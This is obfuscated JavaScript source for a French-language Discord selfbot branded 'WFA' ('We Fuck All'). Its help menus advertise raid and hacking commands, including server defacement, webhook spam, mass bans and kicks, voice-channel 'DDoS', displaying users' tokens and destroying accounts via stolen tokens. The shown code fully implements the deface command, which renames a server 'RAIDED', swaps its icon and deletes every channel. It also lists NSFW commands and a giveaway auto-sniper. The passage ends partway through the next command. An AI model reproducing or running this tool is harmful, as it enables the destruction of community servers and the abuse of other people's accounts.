const Discord = require("discord.js");
require("colors");
const client = new Discord.Client();
const ConfigFile = require("./config.json");
const token = ConfigFile.token;
const yourgif = "https://media.discordapp.net/attachments/812490234427867146/836306573038190652/MOSHED-2021-4-26-20-12-10.gif";
const yourgif1 = "https://media.discordapp.net/attachments/812490234427867146/836305223818805288/MOSHED-2021-4-26-20-13-35.gif";
const color = "BLACK";
const base64 = require("base-64");
const utf8 = require("utf8");
const fs = require("fs");
let os = require("os");
const hastebins = require("hastebin-gen");
const rpcGenerator = require("discordrpcgenerator");
const backups = require("./Data/backups.json");
const afk = require("./Data/afk.json");
const db = require("./Data/pubmp.json");
const lbackup = require("./Data/liste.json");
const kicked = require("./Data/vkick.json");
const prefix = ConfigFile["prefix"];
const superagent = require("superagent");
const fetch = require("node-fetch");
const request = require("request");
const {
    cpuUsage
} = require("process");
function nitrocode(_0x343bx28, _0x343bx29) {
    var _0x343bx2a = "";
    if (_0x343bx29["indexOf"]("0") > -1) {
        _0x343bx2a += "0123456789"
    };
    if (_0x343bx29["indexOf"]("A") > -1) {
        _0x343bx2a += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    };
    if (_0x343bx29["indexOf"]("a") > -1) {
        _0x343bx2a += "abcdefghijklmnopqrstuvwxyz"
    };
    var _0x343bx2b = "";
    for (var _0x343bx2c = _0x343bx28; _0x343bx2c > 0; --_0x343bx2c) {
        _0x343bx2b += _0x343bx2a[Math["floor"](Math["random"]() * _0x343bx2a["length"])]
    };
    return _0x343bx2b
}
const rire = ["https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif", "https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif", "https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif", "https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif", "https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif", "https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif"];
const kiss = ["https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif", "https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif", "https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif", "https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif"];
const hugh = ["https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif", "https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif", "https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif", "https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif"];
const veski = ["https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif", "https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif", "https://media1.giphy.com/media/t7401i4UiIyMo/source.gif"];
const punch = ["https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif", "https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif", "https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif", "https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif"];
var verifLevels = ["None", "Low", "Medium", "(╯°□°）╯︵  ┻━┻"];
var region = {
    Brésil: "Brazil",
    "eu-central": "Central Europe",
    singapoure: "Singapore",
    "us-central": "U.S. Central",
    sydney: "Sydney",
    "us-east": "U.S. East",
    "us-south": "U.S. South",
    "us-west": "U.S. West",
    "eu-west": "Western Europe",
    "vip-us-east": "VIP U.S. East",
    Londre: "London",
    amsterdam: "Amsterdam",
    hongkong: "Hong Kong"
};

function translateDate(_0x343bx35) {
    const _0x343bx36 = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
    const _0x343bx37 = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
    return (_0x343bx37[_0x343bx35["getUTCDay"]()] + ", " + _0x343bx35["getUTCDate"]() + " " + _0x343bx36[_0x343bx35["getUTCMonth"]()] + " " + _0x343bx35["getUTCFullYear"]() + " at " + _0x343bx35["getUTCHours"]() + ":" + zeros(_0x343bx35["getUTCMinutes"](), 2) + ":" + zeros(_0x343bx35["getUTCSeconds"](), 2) + "." + zeros(_0x343bx35["getUTCMilliseconds"](), 3))
}

function checkDays(_0x343bx35) {
    var _0x343bx39 = new Date();
    var _0x343bx3a = _0x343bx39["getTime"]() - _0x343bx35["getTime"]();
    var _0x343bx3b = Math["floor"](_0x343bx3a / 86400000);
    return _0x343bx3b + (_0x343bx3b == 1 ? " day" : " days") + " ago"
}
client["on"]("ready", function () {
    console["log"]("Welcome to WFA" ["bgMagenta"]);
    console["log"](`
                         ╔═════════════════════════════════╗
                         ║--> User Name : ${client["user"]["tag"]}   
                         ╟─────────────────────────────────╢
                         ║-->  User ID : ${client["user"]["id"]} 
                         ╟─────────────────────────────────╢
                         ║-->  Prefix   : ${prefix}                 
                         ╟─────────────────────────────────╢
                         ║-->  Users    : ${client["guilds"]["map"]((_0x343bx3e)=>{return _0x343bx3e["memberCount"]})["reduce"]((_0x343bx3c,_0x343bx3d)=>{return _0x343bx3c+ _0x343bx3d})}  
                         ╟─────────────────────────────────╢
                         ║-->  OS    :    ${os["platform"]}            
                         ╟─────────────────────────────────╢
                         ║-->  Bots     : ${client["users"]["filter"]((_0x343bx3f)=>{return _0x343bx3f["bot"]})["size"]}                 
                         ╟─────────────────────────────────╢
                         ║-->  Channels : ${client["channels"]["size"]}               
                         ╟─────────────────────────────────╢
                         ║-->  Guilds   : ${client["guilds"]["size"]}                 
                         ╚═════════════════════════════════╝ \n\n` ["magenta"]);
    if (client["user"]["premium"] > 0) {
        console["log"]("Vous avez deja nitro gg ;)" ["italic"]["magenta"])
    } else {
        console["log"]("Vous n'avez pas nitro *snif* je vais tout faire pour vous en trouver 1" ["red"])
    }
});
client["on"]("ready", function () {
    if (client["user"]["bot"]) {
        console["log"](`${client["user"]["username"]} est un robot desolée :/` ["red"]);
        process["exit"](1)
    } else {
        console["log"](`${client["user"]["username"]} Boup Bip Boup vous n'etes pas un robot ^^!` ["italic"]["magenta"])
    }
});
var uuid = () => {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11)["replace"](/[018]/g, (_0x343bx3c) => {
        return (_0x343bx3c ^ ((Math["random"]() * 16) >> (_0x343bx3c / 4))).toString(16)
    })
};
client["on"]("ready", function () {
    rpcGenerator["getRpcImage"]("777619769637339156", "wfa_logo")["then"]((_0x343bx41) => {
        rpcGenerator["getRpcImage"]("777619769637339156", "wfa")["then"]((_0x343bx42) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("WFA-Selfbot")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("STREAMING")["setApplicationId"]("777619769637339156")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx42["id"])["setAssetsSmallImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA")["setState"]("\uD835\uDC16\uD835\uDC1E \uD835\uDC05\uD835\uDC2E\uD835\uDC1C\uD835\uDC24 \uD835\uDC00\uD835\uDC25\uD835\uDC25")["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"])
        })
    })
});
let cmd = new Discord.RichEmbed();
cmd["setTimestamp"]()["setColor"](color)["setTitle"]("**Liste des commandes**")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙃𝙚𝙡𝙥**", "`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`, `help raid`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝘽𝙖𝙘𝙠𝙪𝙥** :gear: : ", "`backup friend`, `backup create`,`backup info`, `backup load`, `backup delete`, `backup purge`, `backup info`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙪𝙣** :joy:: ", "`auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣** :tools: : ", "`voice kick`, `set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙉𝙨𝙛𝙬** :underage: :", "`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝙖𝙞𝙙** :no_entry_sign: :", "`deface`, `spam`, `webhook spam`, `create channel`, `stop spam`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 \uD835\uDE43𝙖\uD835\uDE58\uD835\uDE60** :skull_and_crossbones: :", "`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙐𝙩𝙞𝙡𝙚** :globe_with_meridians: :", "`nuke dm`,, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`")["addField"]("**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙩𝙖𝙩𝙪𝙩** :performing_arts: :", "`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_hack = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙃𝙖𝙘𝙠𝙞𝙣𝙜**")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}ddos voc**`, "`Lance une attaque ddos sur les channels vocal`")["addField"](`**${prefix}ddos-stop**`, "`Stop une attaque ddos sur les channels vocal`")["addField"](`**${prefix}token (@user)**`, "`Affiche le token d'un utilisateur`")["addField"](`**${prefix}check token (token)**`, "`Check si un token est valide`")["addField"](`**${prefix}info token (token)**`, "`Affiche les informations d'un utilisateur grace a un token`")["addField"](`**${prefix}fuck token (token)**`, "`Detruit le compte d'un utilisateur grace a un token`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_raid = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙍𝙖𝙞𝙙**")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}create channel**`, "`Creer 10 channels textuel`")["addField"](`**${prefix}deface**`, "`Déface entierement un serveur (nom/icon/channels)`")["addField"](`**${prefix}webhook spam**`, "`Créer 3 webhooks par salon et spam avec (ultra rapide)`")["addField"](`**${prefix}spam (text)**`, "`Spam un text`")["addField"](`**${prefix}stop spam**`, "`Arrete le spam`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help = new Discord.RichEmbed();
help["setTimestamp"]()["setColor"](color)["setTitle"]("🌙**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥**🌙")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}cmd**`, "`Liste des commandes`")["addField"](`**${prefix}help fun**`, "`Affiche les commandes fun` :joy:")["addField"](`**${prefix}help backup**`, "`Affiche les commandes backups` :gear:")["addField"](`**${prefix}help moderation**`, "`Affiche les commandes moderation` :tools:")["addField"](`**${prefix}help utile**`, "`Affiche les commandes info` :globe_with_meridians:")["addField"](`**${prefix}help nsfw**`, "`Affiche les commandes nsfw` :underage:")["addField"](`**${prefix}help raid**`, "`Affiche les commandes raid` :no_entry_sign: ")["addField"](`**${prefix}help hack**`, "`Affiche les commandes hack` :skull_and_crossbones:")["addField"](`**${prefix}help statut**`, "`Affiche les commandes statut` :performing_arts:")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_statut = new Discord.RichEmbed()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙎𝙩𝙖𝙩𝙪𝙩** :performing_arts: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}rocket league (text)**`, "`Met un statut Rocket League`")["addField"](`**${prefix}spotify (text)**`, "`Met un statut Spofity`")["addField"](`**${prefix}fortnite (text)**`, "`Met un statut Fortnite`")["addField"](`**${prefix}among us (text)**`, "`Met un statut Among us`")["addField"](`**${prefix}gucci (text)**`, "`Met un statut Gucci`")["addField"](`**${prefix}lacoste (text)**`, "`Met un statut Lacoste`")["addField"](`**${prefix}nike (text)**`, "`Met un statut Nike`")["addField"](`**${prefix}google (text)**`, "`Met un statut Google`")["addField"](`**${prefix}skype (text)**`, "`Met un statut Skype`")["addField"](`**${prefix}snapchat (text)**`, "`Met un statut Snapchat`")["addField"](`**${prefix}facebook (text)**`, "`Met un statut Facebook`")["addField"](`**${prefix}tiktok (text)**`, "`Met un statut Tiktok`")["addField"](`**${prefix}twitter (text)**`, "`Met un statut Twitter`")["addField"](`**${prefix}minecraft (text)**`, "`Met un statut Minecraft`")["addField"](`**${prefix}instagram (text)**`, "`Met un statut Instagram`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_statut2 = new Discord.RichEmbed()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙎𝙩𝙖𝙩𝙪𝙩** :performing_arts: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}youtube (text)**`, "`Met un statut Youtube`")["addField"](`**${prefix}tokyo ghoul (text)**`, "`Met un statut Tokyo Ghoul`")["addField"](`**${prefix}hunter x hunter (text)**`, "`Met un statut Hunter x Hunter`")["addField"](`**${prefix}naruto (text)**`, "`Met un statut Naruto`")["addField"](`**${prefix}clash of clan (text)**`, "`Met un statut Clash of Clan`")["addField"](`**${prefix}clash royal (text)**`, "`Met un statut Clash Royal`")["addField"](`**${prefix}tinder (text)**`, "`Met un statut Tinder`")["addField"](`**${prefix}pornhub (text)**`, "`Met un statut Pornhub`")["addField"](`**${prefix}roblox (text)**`, "`Met un statut Roblox`")["addField"](`**${prefix}csgo (text)**`, "`Met un statut Csgo`")["addField"](`**${prefix}apex (text)**`, "`Met un statut Apex`")["addField"](`**${prefix}badlion (text)**`, "`Met un statut Badlion`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_backup = new Discord.RichEmbed()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝘽𝙖𝙘𝙠𝙪𝙥** :gear: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}backup create**`, "`Créé une backup d'un serveur`")["addField"](`**${prefix}backup friend**`, "`Créé une backup de tous tes amis`")["addField"](`**${prefix}backup load (id)**`, "`Charge une backup`")["addField"](`**${prefix}backup liste**`, "`Voir toutes ses backups`")["addField"](`**${prefix}backup delete (id)**`, "`Surppime une backup`")["addField"](`**${prefix}backup purge**`, "`Supprime toutes tes backups`")["addField"](`**${prefix}backup info (id)**`, "`Envoie les informations d'une backup`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_fun = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙁𝙪𝙣** :joy: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}start typing**`, "`Vous affiche entrain d'ecrire indefiniment`")["addField"](`**${prefix}avatar (@user)**`, "`Affiche l'avatar d'un membre`")["addField"](`**${prefix}lovecalc (@user)**`, "`Test d'amour`")["addField"](`**${prefix}nitro**`, "`Genere un nitro random`")["addField"](`**${prefix}8ball (text)**`, "`Pose une question`")["addField"](`**${prefix}say (text)**`, "`Affiche un text en embed`")["addField"](`**${prefix}fight (@user)**`, "`Bat toi avec un utilisateur`")["addField"](`**${prefix}boom (@user)**`, "`Fait exploser un utilisateur`")["addField"](`**${prefix}rire**`, "`Envoie un gif rire`")["addField"](`**${prefix}kiss (@user)**`, "`Embrasse un membre`")["addField"](`**${prefix}veski (@user)**`, "`Envoie un gif veski`")["addField"](`**${prefix}load**`, "`Envoie un chargement`")["addField"](`**${prefix}branlette**`, "`Simule une grosse branlette + éjaculation`")["addField"](`**${prefix}punch (@user)**`, "`Frappe un membre`")["addField"](`**${prefix}calin (@user)**`, "`Fait un calin a un membre`")["addField"](`**${prefix}reverse (text)**`, "`Met ton text a l'envers`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_moderation = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣** :tools: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}voice kick (@user)**`, "`Kick un utilisateur du salon vocal`")["addField"](`**${prefix}set serveur name (text)**`, "`Change le nom du serveur`")["addField"](`**${prefix}shutdown**`, "`Eteint le selfbot`")["addField"](`**${prefix}name all**`, "`Rename tout les membres d'un serveur`")["addField"](`**${prefix}ban-all**`, "`Ban tout les membres d'un serveur`")["addField"](`**${prefix}kick-all**`, "`Kick tout les membres d'un serveur`")["addField"](`**${prefix}kick (@user)**`, "`kick un membre du serveur`")["addField"](`**${prefix}ban (@user)**`, "`Ban un membre du serveur`")["addField"](`**${prefix}roles list**`, "`Envoie la liste de tout les roles d'un serveur`")["addField"](`**${prefix}channels list**`, "`Envoie la liste de tout les channels d'un serveur`")["addField"](`**${prefix}purge**`, "`Supprime tout les messages`")["addField"](`**${prefix}delete all channel**`, "`Supprime tout les salons d'un serveur`")["addField"](`**${prefix}delete all role**`, "`Supprime tout les roles d'un serveur`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_info = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙐𝙩𝙞𝙡𝙚** :globe_with_meridians: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}mp all**`, "`Permet de dm toutes les personnes d'un serveur`")["addField"](`**${prefix}stop mp all**`, "`Permet de stopé la commande mp all`")["addField"](`**${prefix}auto voice kick (@user)**`, "`Permet de kick un utilisateur du vocal (parfait pour troll)`")["addField"](`**${prefix}stop auto voice kick (@user)**`, "`Permet de stopé la commande auto voice kick`")["addField"](`**${prefix}nuke dm**`, "`Nuke tout tes dm (sans les clear) pour limiter les beugs et l'ésthetique`")["addField"](`**${prefix}afk (text)**`, '`Pour te definir comme "afk"`')["addField"](`**${prefix}user info (@user)**`, "`Envoie les information d'un membre du serveur`")["addField"](`**${prefix}serveur info**`, "`Envoie les information du serveur`")["addField"](`**${prefix}stats**`, "`Affiche les stats du selfbot`")["addField"](`**${prefix}restart**`, "`Redemarre le selfbot`")["addField"](`**${prefix}reset**`, "`Reset le status`")["addField"](`**${prefix}role info (@role)**`, "`Envoie les informations d'un role`")["addField"](`**${prefix}encode (text)**`, "`Crypte ton text en base64`")["addField"](`**${prefix}discord**`, "`Affiche votre version de discord js`")["addField"](`**${prefix}gen token**`, "`Change votre token`")["addField"](`**${prefix}add emote (emote) <name>**`, "`Ajoute un emoji au serveur`")["addField"](`**${prefix}emote (emote)**`, "`Donne les infos tout les emojis d'un serveur`")["addField"](`**${prefix}remove emote (emote)**`, "`Supprime un emoji du serveur`")["addField"](`**${prefix}steal emote (serveur id)**`, "`Ajoute tout les emojis d'un serveur a ton serveur`")["addField"](`**${prefix}delete all emote**`, "`Supprime tout les emojis du serveur`")["addField"](`**${prefix}grab pp (user)**`, "`Vole la photo de profile de la personne mentionné`")["addField"](`**${prefix}check token (token)**`, "`Vérifie si le token est valide`")["addField"](`**${prefix}mp friend (message)**`, "`Envoie un message privé a tout tes amis`")["addField"](`**${prefix}change hypesquad (brilliance/bravery/ballance)**`, "`Permet de changer sa maison hypesquad`")["addField"](`**nitro autoclaim**`, "`Un autoclaim est en permanance activé sur le self`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");
let help_nsfw = new Discord.RichEmbed()["setTimestamp"]()["setColor"](color)["setTitle"]("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙣𝙨𝙛𝙬** :underage: ")["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["addField"](`**${prefix}ass**`, "`Envoie une photo de fesse`")["addField"](`**${prefix}4k**`, "`Envoie une image sexe en 4k`")["addField"](`**${prefix}anal**`, "`Envoie un gif anal`")["addField"](`**${prefix}hentai**`, "`Envoie une image/gif hentai`")["addField"](`**${prefix}nsfw-gif**`, "`Envoie un gif de sexe`")["addField"](`**${prefix}pussy**`, "`Envoie une image de chattes`")["addField"](`**${prefix}thigh**`, "`Envoie une image thigh`")["setDescription"]("`" + `le prefix est:  ${prefix}` + "`")["setImage"](yourgif)["setThumbnail"](yourgif1)["setFooter"]("We Fuck All");

function saver() {
    fs["writeFile"]("./Data/pubmp.json", JSON["stringify"](db), (_0x343bx16) => {
        if (_0x343bx16) {
            console["error"](_0x343bx16)
        }
    })
}
client["on"]("message", (_0x343bx50) => {
    async function _0x343bx51() {
        const _0x343bx52 = Math["floor"](Math["random"]() * 1500);
        async function _0x343bx53() {
            _0x343bx50["react"]("🎉")["catch"]((_0x343bx16) => {
                if (_0x343bx16) {
                    console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
                    console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
                    console["log"]("║--> [", `/!/ Attention` ["red"], "]", `\nJe n'ai pas reussi a reagir au giveaway sur ${_0x343bx50["guild"]["name"]}, il est possible que je n'ai pas les permissions :/` ["green"]);
                    console["log"]("╚═════════════════════════════════╝" ["blue"]);
                    return
                }
            });
            console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
            console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
            console["log"]("║--> [", `Youpi` ["green"], "]", `\nJ'ai pas correctement a reagit au giveaway sur ${_0x343bx50["guild"]["name"]}, en ${_0x343bx52}ms je suis super rapide hehe ;)` ["green"]);
            console["log"]("╚═════════════════════════════════╝" ["blue"])
        }
        setTimeout(_0x343bx53, _0x343bx52)
    }
    async function _0x343bx54() {
        if (_0x343bx50["author"]["id"] == "294882584201003009" || _0x343bx50["author"]["id"] == "716967712844414996") {
            if (_0x343bx50["content"]["includes"]("Congratulations")) {
                if (_0x343bx50["content"]["includes"](client["user"]["id"])) {
                    if (_0x343bx50["embeds"]) {
                        console["log"]("\n╔═════════════════════════════════╗" ["blue"])
                    };
                    console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
                    console["log"]("║--> [", `GG!` ["green"], "]", `\nJe t'ai fais gagner le giveaway sur le serveur ${_0x343bx50["guild"]["name"]} va vite reclamer ta récompense!` ["green"]);
                    console["log"]("╚═════════════════════════════════╝" ["blue"])
                }
            }
        }
    }
    _0x343bx54();
    if (_0x343bx50["author"]["id"] == "294882584201003009" || _0x343bx50["author"]["id"] == "716967712844414996") {
        if (_0x343bx50["embeds"][0]) {
            if (_0x343bx50["embeds"][0]["description"]["includes"]("React with")) {
                _0x343bx51()
            }
        }
    };
    let _0x343bx55 = _0x343bx50;
    if (_0x343bx50["author"]["id"] === client["user"]["id"]) {
        if (afk[client["user"]["id"]]) {
            if (_0x343bx50["content"]["includes"](":x:")) {
                return
            } else {
                delete afk[client["user"]["id"]]
            };
            saving();
            _0x343bx50["channel"]["send"](":white_check_mark: **Vous n'etes plus afk**");
            console["log"]("Commande afk stopé." ["yellow"])
        }
    };
    if (_0x343bx50["content"]["includes"](client["user"]["id"])) {
        if (_0x343bx50["author"]["id"] === client["user"]["id"]) {
            return
        };
        if (afk[client["user"]["id"]]) {
            _0x343bx50["reply"](":x: **Je suis afk pour la raison** " + afk[client["user"]["id"]]["r"]);
            console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
            console["log"]("║--> [Log:]" ["red"]);
            console["log"]("╟─────────────────────────────────╢" ["blue"]);
            console["log"]("║--> [", `/!\\ Attention` ["red"], "]", `\nl'utilisateur ${_0x343bx50["author"]["username"]} vient de vous ping lors de votre afk ${_0x343bx50["content"]}` ["green"]);
            console["log"]("╚═════════════════════════════════╝" ["blue"])
        } else {
            return
        }
    };
    var _0x343bx56 = _0x343bx50["content"]["substring"](prefix["length"])["split"](" ");
    var _0x343bx57 = _0x343bx50["mentions"]["users"]["first"]();
    if (_0x343bx50["channel"]["type"] === "dm") {
        if (_0x343bx55["author"]["bot"]) {
            if (_0x343bx50["content"]["includes"]("discord.gg")) {
                let _0x343bx58 = _0x343bx50["author"];
                _0x343bx58["send"](`/!\\ Anti mp`)["then"]((_0x343bx55) => {
                    _0x343bx55["delete"]()
                });
                console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
                console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
                console["log"]("║--> [", `/!/ Attention` ["red"], "]", `\nle bot ${_0x343bx50["author"]["username"]} vient de vous envoyer une invatation suspecte ${_0x343bx50["content"]}` ["green"]);
                console["log"]("╚═════════════════════════════════╝" ["blue"])
            }
        }
    };
    if (_0x343bx55["author"]["id"] !== client["user"]["id"]) {
        return
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "deface")) {
        if (_0x343bx50["channel"]["type"] === "dm" || _0x343bx50["channel"]["type"] === "group") {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**.")
        };
        if (!_0x343bx50["member"]["hasPermission"]("ADMINISTRATOR")) {
            return _0x343bx50["edit"](":x: **Vous n'avez pas les permissions pour executer cette commande**")
        };
        _0x343bx50["delete"]();
        _0x343bx50["guild"]["setName"](`RAIDED BY WFA X ${client["user"]["username"]}`);
        _0x343bx50["guild"]["setIcon"]("https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=x3676&height=x3676");
        _0x343bx50["guild"]["channels"]["forEach"]((_0x343bx59) => {
            if (!_0x343bx59) {
                return
            };
            _0x343bx59["delete"]()
        });
        _0x343bx50["guild"]["createChannel"]("wfa", "text");
        console["log"]("Commande deface executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "create channel")) {
        if (_0x343bx50["channel"]["type"] === "dm" || _0x343bx50["channel"]["type"] === "group") {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**.")
        };
